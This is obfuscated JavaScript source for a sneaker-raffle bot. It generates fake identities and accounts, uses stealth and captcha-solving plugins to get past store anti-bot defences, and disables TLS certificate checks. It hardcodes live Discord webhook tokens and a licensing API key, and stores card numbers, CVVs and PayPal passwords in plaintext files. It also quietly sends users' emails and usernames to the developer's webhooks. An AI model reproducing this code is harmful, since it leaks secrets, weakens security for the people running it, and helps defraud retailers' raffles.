process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x2e1301 = require('fs'), _0x436b67 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x222225(_0x58b9ae) {
    const _0x570806 = _0x2e1301['createWriteStream'](_0x58b9ae, { 'flags': 'a' }), _0x1e69fe = console['log'];
    console['log'] = function () {
        const _0x17b3f6 = Array['prototype']['slice']['call'](arguments), _0x549e75 = _0x17b3f6['join']('\x20') + '\x0a';
        _0x570806['write'](_0x549e75), _0x1e69fe['apply'](console, _0x17b3f6);
    };
}
_0x222225('../logs/log\x20' + _0x436b67);
var _0x1af6fa = require('tough-cookie'), _0x550e5b = require('node-imap'), _0x3c8f6a = require('util')['inspect'];
const _0x169414 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x59ccb4 } = require('discord.js');
var _0x3043f2 = require('exe');
const { execFile: _0x3861bb } = require('child_process'), _0x3430c5 = require('puppeteer-extra'), _0x4fb3d8 = require('puppeteer-extra-plugin-recaptcha'), _0x5c6730 = require('puppeteer-extra-plugin-stealth'), _0x1446ca = require('chalk'), _0xe0def5 = require('node-bash-title'), _0x5bedf9 = require('axios'), _0x221bee = require('papaparse');
var _0x134985 = require('random-name');
const _0x1c9afe = require('request');
var _0x4f0735 = require('prompt');
const _0x406b27 = _0x1c9afe['jar']();
var _0x395552 = {};
const _0x2649e0 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x36ec08 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x1627e5 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x43f19d = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x47cc80 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x1abdfe = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x36d6f7 = 'https://discord.com/api/webhooks/', _0x1d36cd = '' + _0x36d6f7 + _0x1627e5, _0x30a02b = '' + _0x36d6f7 + _0x43f19d, _0x2b6dac = '' + _0x36d6f7 + _0x2649e0, _0x40c5c7 = '' + _0x36d6f7 + _0x36ec08, _0xd9f2b8 = '' + _0x36d6f7 + _0x47cc80, _0x3b27cd = '' + _0x36d6f7 + _0x1abdfe;
const _0x22c062 = JSON['parse'](_0x2e1301['readFileSync']('../package.json', 'utf-8')), _0x5e7c75 = _0x22c062['version'];
var _0x1946fb, _0x487348, _0xd9076c, _0x2555de, _0x35b8b9, _0xe45594, _0x25f505, _0x314774;
const _0xc2e6ad = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x4f1ec7 = ![];
const _0x4a486a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x2401e6 = '0123456789';
var _0x463576 = _0x4a486a['split']('');
const _0x32e686 = require('auto-git-update'), _0x7ad699 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x2d6708 = new _0x32e686(_0x7ad699);
async function _0x4c322() {
    _0x35b8b9 = _0x2e1301['readdirSync']('../proxies'), _0x2555de = _0x2e1301['readdirSync']('../tasks'), !_0x2e1301['existsSync']('../accounts/fenom.csv') && _0x2e1301['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x2e1301['existsSync']('../accounts/paypal.csv') && _0x2e1301['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x2e1301['existsSync']('../accounts/bstn.csv') && _0x2e1301['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x2e1301['existsSync']('../accounts/eql.csv') && _0x2e1301['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x2e1301['existsSync']('../failed-tasks.csv') && _0x2e1301['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x2e1301['existsSync']('../successful-tasks.csv') && _0x2e1301['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x395552 = JSON['parse'](_0x2e1301['readFileSync']('../settings.json', 'utf-8')), !_0x395552['delay'] && (_0x395552['delay'] = 0x3c, _0x2e1301['writeFileSync']('../settings.json', JSON['stringify'](_0x395552, null, 0x2))), !_0x395552['masterMail'] && (_0x395552['masterMail'] = 'yourmail@gmail.com', _0x2e1301['writeFileSync']('../settings.json', JSON['stringify'](_0x395552, null, 0x2))), !_0x395552['masterPassword'] && (_0x395552['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x2e1301['writeFileSync']('../settings.json', JSON['stringify'](_0x395552, null, 0x2))), !_0x395552['captchaKey'] && (_0x395552['captchaKey'] = '', _0x2e1301['writeFileSync']('../settings.json', JSON['stringify'](_0x395552, null, 0x2))), !_0x395552['useRandomProxy'] && (_0x395552['useRandomProxy'] = !![], _0x2e1301['writeFileSync']('../settings.json', JSON['stringify'](_0x395552, null, 0x2))), !_0x395552['shuffleTasks'] && (_0x395552['shuffleTasks'] = ![], _0x2e1301['writeFileSync']('../settings.json', JSON['stringify'](_0x395552, null, 0x2))), !_0x395552['webhook'] && (_0x395552['webhook'] = '', _0x2e1301['writeFileSync']('../settings.json', JSON['stringify'](_0x395552, null, 0x2))), _0x395552['delay'] <= 0x1388 && (_0x395552['delay'] = _0x395552['delay'] * 0x3e8), _0x395552['AfewDelay'] && (delete _0x395552['AfewDelay'], _0x2e1301['writeFileSync']('../settings.json', JSON['stringify'](_0x395552, null, 0x2))), _0x395552['MahaDelay'] && (delete _0x395552['MahaDelay'], _0x2e1301['writeFileSync']('../settings.json', JSON['stringify'](_0x395552, null, 0x2))), _0x395552['footshopDelay'] && (delete _0x395552['footshopDelay'], _0x2e1301['writeFileSync']('../settings.json', JSON['stringify'](_0x395552, null, 0x2))), _0x395552['MahaDelay'] = _0x395552['delay'], _0x36d6f7 = _0x395552['webhook'], _0xe45594 = _0x395552['licenseKey'];
}
let _0x587467, _0x9f339f = [], _0x2cbc4a;
const _0x17175c = _0x418738 => new Promise(_0x8c6731 => setTimeout(_0x8c6731, _0x418738));
function _0x224b07(_0x40344d, _0x1a8346) {
    return Math['floor'](Math['random']() * (_0x1a8346 - _0x40344d + 0x1) + _0x40344d);
}
function _0x204c5b(_0x2fa349) {
    let _0x5e7fb3 = _0x2fa349['length'], _0x2017d0;
    while (_0x5e7fb3 != 0x0) {
        _0x2017d0 = Math['floor'](Math['random']() * _0x5e7fb3), _0x5e7fb3--, [_0x2fa349[_0x5e7fb3], _0x2fa349[_0x2017d0]] = [
            _0x2fa349[_0x2017d0],
            _0x2fa349[_0x5e7fb3]
        ];
    }
    return _0x2fa349;
}
async function _0x9ea931(_0x36fe18) {
    return _0x5bedf9['get']('https://api.hyper.co/v4/licenses/' + _0x36fe18, { 'headers': { 'Authorization': 'Bearer\x20' + _0xc2e6ad } })['then'](_0x7e790 => _0x7e790['data'])['catch'](() => null);
}
;
async function _0x16671b(_0x202dec) {
    console['clear']();
    if (_0x202dec == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x1066cb = await _0x4f0735['get']('License');
        if (_0x1066cb['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x17175c(0xbb8), _0x16671b(_0x202dec);
        _0x202dec = _0x1066cb['License'], _0x395552['licenseKey'] = _0x202dec, _0xe45594 = _0x202dec, _0x2e1301['writeFileSync']('../settings.json', JSON['stringify'](_0x395552));
    }
    console['log']('Checking\x20license\x20' + _0xe45594 + '...'), await _0x17175c(0x320);
    const _0x436e3a = await _0x9ea931(_0x202dec);
    _0x25f505 = JSON['stringify'](_0x436e3a['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x314774 = JSON['stringify'](_0x436e3a['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x436e3a)
        return console['log']('License\x20not\x20found');
    if (!_0x436e3a['user'])
        return console['log']('License\x20not\x20bound');
    return _0x436e3a['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x4f1ec7 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x4f1ec7 = ![]);
}
async function _0x76bbad() {
    var _0x396181 = await _0x4f0735['get']('Module');
    return console['clear'](), _0x396181['Module'];
}
;
async function _0x38be69() {
    var _0x3a8073 = await _0x4f0735['get']('Setting');
    return console['clear'](), _0x3a8073['Setting'];
}
async function _0x294f5d(_0x12bc09) {
    var _0x29018a = [];
    for (file of _0x2555de) {
        var _0x32d8d0 = _0x2e1301['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x221bee['parse'](_0x32d8d0, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x12bc09['store'] && _0x29018a['push'](file);
    }
    !_0x29018a['length'] == 0x0 && (_0x2555de = _0x29018a);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x50b7ec = 0x0; _0x50b7ec < _0x2555de['length']; _0x50b7ec++) {
        console['log']('\x20(' + _0x50b7ec + ')\x20' + _0x2555de[_0x50b7ec]);
    }
    console['log']('');
    var _0x50ab3a = await _0x4f0735['get']('Task');
    if (_0x50ab3a['Task'] > _0x2555de['length'] - 0x1 || isNaN(_0x50ab3a['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x17175c(0x3e8), _0x294f5d();
    var _0x367b35 = _0x2e1301['readFileSync']('../tasks/' + _0x2555de[_0x50ab3a['Task']], 'utf-8');
    return _0xd9076c = _0x221bee['parse'](_0x367b35, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x1446ca['blue'](_0x2555de[_0x50ab3a['Task']])), _0x1946fb = _0x2555de[_0x50ab3a['Task']], _0xd9076c;
}
async function _0x15a781() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x1a8476 = 0x0; _0x1a8476 < _0x35b8b9['length']; _0x1a8476++) {
        console['log']('\x20(' + _0x1a8476 + ')\x20' + _0x35b8b9[_0x1a8476]);
    }
    console['log']('');
    var _0x14aef0 = await _0x4f0735['get']('Proxies');
    if (_0x14aef0['Proxies'] > _0x35b8b9['length'] - 0x1 || isNaN(_0x14aef0['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x17175c(0x3e8), _0x15a781();
    var _0x4f0f05 = _0x2e1301['readFileSync']('../proxies/' + _0x35b8b9[_0x14aef0['Proxies']], 'utf-8')['split']('\x0a');
    let _0x301bb3 = _0x4f0f05['map']((_0x15cbaa, _0x39f9bb) => {
        sanatizeProxy = _0x15cbaa['replace']('\x0d', '');
        if (_0x4f0f05[_0x39f9bb + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x487348 = _0x35b8b9[_0x14aef0['Proxies']], console['clear'](), _0x301bb3;
}
async function _0x54d055() {
    var _0x2cfc6f = await _0x4f0735['get']('Value');
    return console['clear'](), _0x2cfc6f['Value'];
}
async function _0x1c3994(_0x2b6458) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0xa507ae = 0x0; _0xa507ae < _0x2b6458['length']; _0xa507ae++) {
        console['log']('\x20(' + _0xa507ae + ')\x20[' + _0x2b6458[_0xa507ae]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x44fb8c = await _0x4f0735['get']('Module');
    return _0x44fb8c['Module'];
}
async function _0x582970() {
    var _0x4b5ee1 = await _0x4f0735['get']('Password');
    return console['clear'](), _0x4b5ee1['Password'];
}
;
async function _0x5b4fed() {
    var _0x399d47 = await _0x4f0735['get']('Links');
    return _0x399d47['Links'];
}
;
async function _0x3c91f4() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x52613c = 0x0; _0x52613c < _0x9f339f['length']; _0x52613c++) {
        console['log']('\x20(' + _0x52613c + ')\x20' + _0x9f339f[_0x52613c]);
    }
    ;
    console['log']();
    let _0x25fc7f = await _0x4f0735['get']('Product');
    return console['clear'](), _0x25fc7f['Product'];
}
;
function _0x34a417() {
    var _0x2e5be4 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x2e5be4;
}
;
function _0x546c48() {
    var _0x3ba883 = new Date(Date['now']())['toLocaleString']();
    return _0x3ba883['replace'](',', '');
}
async function _0x17b782(_0x3ace5c, _0x5dc699) {
    let _0x2f6e57 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x5e7c75 != 'devkey') {
        await _0x5bedf9['post'](_0x3ace5c, _0x5dc699, _0x2f6e57);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x262703(_0x1e2023, _0x560b5a, _0x5374cb, _0x2d0bb4, _0x171985) {
    if (!_0x2d0bb4 && _0x5374cb == 'dev') {
        var _0x3663b3 = new _0x59ccb4()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x560b5a['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x560b5a['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x1e2023['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x395552['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x25f505,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x1e2023['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x1e2023['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x5e7c75,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x3663b3['data'];
    } else {
        if (_0x2d0bb4 && _0x5374cb == 'dev') {
            var _0x3663b3 = new _0x59ccb4()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x560b5a['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x25f505,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x560b5a['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x1e2023['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x395552['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x171985,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x1e2023['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x1e2023['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x5e7c75,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x3663b3['data'];
        } else {
            if (_0x5374cb == 'pub') {
                var _0x3663b3 = new _0x59ccb4()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x560b5a['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x560b5a['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x1e2023['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x395552['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x1e2023['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x5e7c75,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x3663b3['data'];
            } else {
                if (_0x5374cb == 'acc' && !_0x2d0bb4) {
                    var _0x3663b3 = new _0x59ccb4()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x560b5a['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x25f505,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x560b5a['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x395552['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x5e7c75,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x3663b3['data'];
                } else {
                    if (_0x5374cb == 'acc' && _0x2d0bb4) {
                        var _0x3663b3 = new _0x59ccb4()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x560b5a['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x25f505,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x171985,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x560b5a['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x395552['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x5e7c75,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x3663b3['data'];
                    } else {
                        if (_0x5374cb == 'open') {
                            var _0x3663b3 = new _0x59ccb4()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x314774)['addFields']({
                                'name': 'User',
                                'value': '' + _0x25f505,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x5e7c75,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x3663b3['data'];
                        } else {
                            if (!_0x2d0bb4 && _0x5374cb == 'ver') {
                                var _0x3663b3 = new _0x59ccb4()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x560b5a['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x25f505,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x560b5a['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x395552['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x5e7c75,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x3663b3['data'];
                            } else {
                                if (_0x2d0bb4 && _0x5374cb == 'ver') {
                                    var _0x3663b3 = new _0x59ccb4()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x560b5a['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x25f505,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x171985,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x560b5a['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x395552['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x5e7c75,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x3663b3['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x195de7(_0x3a682a, _0x32be38) {
    var _0x244396 = _0x3a682a[_0x32be38]['Address1']['split'](''), _0x37312a = _0x3a682a[_0x32be38]['Address2']['split'](''), _0x535c19 = _0x3a682a[_0x32be38]['Email']['split']('@');
    for (var _0x4ff6da = 0x0; _0x4ff6da < _0x244396['length']; _0x4ff6da++) {
        if (_0x244396[_0x4ff6da] == 'X') {
            var _0x199d51 = Math['round'](Math['random']() * (_0x4a486a['length'] - 0x1));
            _0x244396[_0x4ff6da] = _0x463576[_0x199d51];
        }
    }
    ;
    for (var _0x4ff6da = 0x0; _0x4ff6da < _0x37312a['length']; _0x4ff6da++) {
        if (_0x37312a[_0x4ff6da] == 'X') {
            var _0x199d51 = Math['round'](Math['random']() * (_0x4a486a['length'] - 0x1));
            _0x37312a[_0x4ff6da] = _0x463576[_0x199d51];
        }
    }
    ;
    _0x3a682a[_0x32be38]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x3a682a[_0x32be38]['FirstName'] = _0x134985['first']());
    _0x3a682a[_0x32be38]['LastName']['toUpperCase']() == 'RANDOM' && (_0x3a682a[_0x32be38]['LastName'] = _0x134985['last']());
    _0x535c19[0x0]['toUpperCase']() == 'RANDOM' ? _0x535c19[0x0] = '' + _0x134985['first']() + _0x134985['last']() + _0x224b07(0x1, 0x270f) + '@' : _0x535c19[0x0] = _0x535c19[0x0] + '@';
    _0x3a682a[_0x32be38]['Email'] = _0x535c19['join'](''), _0x3a682a[_0x32be38]['Address1'] = _0x244396['join'](''), _0x3a682a[_0x32be38]['Address2'] = _0x37312a['join']('');
    _0x3a682a[_0x32be38]['Phone'] == 'RANDOM' && (_0x3a682a[_0x32be38]['Phone'] = '0' + _0x224b07(0x5f5e100, 0x3b9ac9ff));
    if (_0x3a682a[_0x32be38]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x5e254b = _0x224b07(0x1, 0x270f);
        _0x3a682a[_0x32be38]['Follower'] = '' + _0x134985['first']() + _0x134985['last']() + _0x5e254b + '\x20';
    }
    _0x3a682a[_0x32be38]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x3a682a[_0x32be38]['HouseNumber'] = _0x224b07(0x1, 0xc8));
    if (_0x3a682a[_0x32be38]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x2489e3 = Math['round'](Math['random']() * (_0x4a486a['length'] - 0x1)), _0x5675b5 = _0x463576[_0x2489e3];
        _0x3a682a[_0x32be38]['Address1'] = _0x134985['last']() + 'straat', _0x3a682a[_0x32be38]['Zip'] == '' && (_0x3a682a[_0x32be38]['Postcode'] = _0x224b07(0x3e8, 0x270f) + '\x20' + _0x5675b5 + _0x5675b5, _0x3a682a[_0x32be38]['Zip'] = _0x3a682a[_0x32be38]['Postcode']), _0x3a682a[_0x32be38]['HouseNumber'] = '' + _0x224b07(0x1, 0xc8);
    }
    return;
}
;
async function _0x2848bf(_0xe7603b, _0x475e49) {
    _0x2e1301['appendFileSync']('../failed-tasks.csv', _0x546c48() + ',' + _0x475e49['store'] + ',' + _0x475e49['name'] + ',' + _0xe7603b['Url'] + ',' + _0xe7603b['Size'] + ',' + _0xe7603b['Follower'] + ',' + _0xe7603b['FirstName'] + ',' + _0xe7603b['LastName'] + ',' + _0xe7603b['Address1'] + ',' + _0xe7603b['Address2'] + ',' + _0xe7603b['HouseNumber'] + ',' + _0xe7603b['Zip'] + ',' + _0xe7603b['City'] + ',' + _0xe7603b['State'] + ',' + _0xe7603b['Country'] + ',' + _0xe7603b['Phone'] + ',' + _0xe7603b['Email'] + ',' + _0xe7603b['Password'] + ',' + _0xe7603b['PaymentMethod'] + ',' + _0xe7603b['CardType'] + ',' + _0xe7603b['NameOnCard'] + ',' + _0xe7603b['CardNumber'] + ',' + _0xe7603b['ExpiryDate'] + ',' + _0xe7603b['CVV'] + ',' + _0xe7603b['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x12263c(_0x50c89c, _0x8d652e) {
    _0x2e1301['appendFileSync']('../successful-tasks.csv', _0x546c48() + ',' + _0x8d652e['store'] + ',' + _0x8d652e['name'] + ',' + _0x50c89c['Url'] + ',' + _0x50c89c['Size'] + ',' + _0x50c89c['Follower'] + ',' + _0x50c89c['FirstName'] + ',' + _0x50c89c['LastName'] + ',' + _0x50c89c['Address1'] + ',' + _0x50c89c['Address2'] + ',' + _0x50c89c['HouseNumber'] + ',' + _0x50c89c['Zip'] + ',' + _0x50c89c['City'] + ',' + _0x50c89c['State'] + ',' + _0x50c89c['Country'] + ',' + _0x50c89c['Phone'] + ',' + _0x50c89c['Email'] + ',' + _0x50c89c['Password'] + ',' + _0x50c89c['PaymentMethod'] + ',' + _0x50c89c['CardType'] + ',' + _0x50c89c['NameOnCard'] + ',' + _0x50c89c['CardNumber'] + ',' + _0x50c89c['ExpiryDate'] + ',' + _0x50c89c['CVV'] + ',' + _0x50c89c['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x4bc8d6() {
    let _0x15da7b = proxyFile['split']('\x0a'), _0x2358d1 = _0x15da7b['map']((_0x1108c0, _0x39782b) => {
        sanatizeProxy = _0x1108c0['replace']('\x0d', '');
        if (_0x15da7b[_0x39782b + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x2358d1;
}
;
async function _0x1c50ad(_0x4d1f2e, _0x771292) {
    if (_0x2fb50e != 'yes')
        var _0x2fb50e = '', _0x293152 = 0x0;
    async function _0x4492c4() {
        var _0x2a1658 = _0x2e1301['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x3ad9ce = _0x221bee['parse'](_0x2a1658, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x1504d5 = 0x0; _0x1504d5 < _0x3ad9ce['length']; _0x1504d5++) {
            console['log']('(' + _0x1504d5 + ')\x20' + _0x3ad9ce[_0x1504d5]['Email']);
        }
        console['log']('\x0a(' + _0x3ad9ce['length'] + ')\x20' + _0x1446ca['cyan']('Add\x20a\x20new\x20account'));
        let _0x26efa2 = await _0x4f0735['get']('Option');
        if (_0x26efa2['Option'] < _0x3ad9ce['length'])
            return _0x3ad9ce[_0x26efa2['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x21f669 = {}, _0x59549d = await _0x4f0735['get']('Email');
        _0x21f669['Email'] = _0x59549d['Email'];
        var _0x43c990 = Math['round'](Math['random']() * (_0x771292['length'] - 0x1));
        _0x21f669['Proxy'] = _0x771292[_0x43c990], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x3575e8 = await _0x4f0735['get']('Password');
        return _0x21f669['Password'] = _0x3575e8['Password'], _0x2e1301['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x21f669['Email'] + ',' + _0x21f669['Password'] + ',' + _0x21f669['Proxy']), _0x21f669;
    }
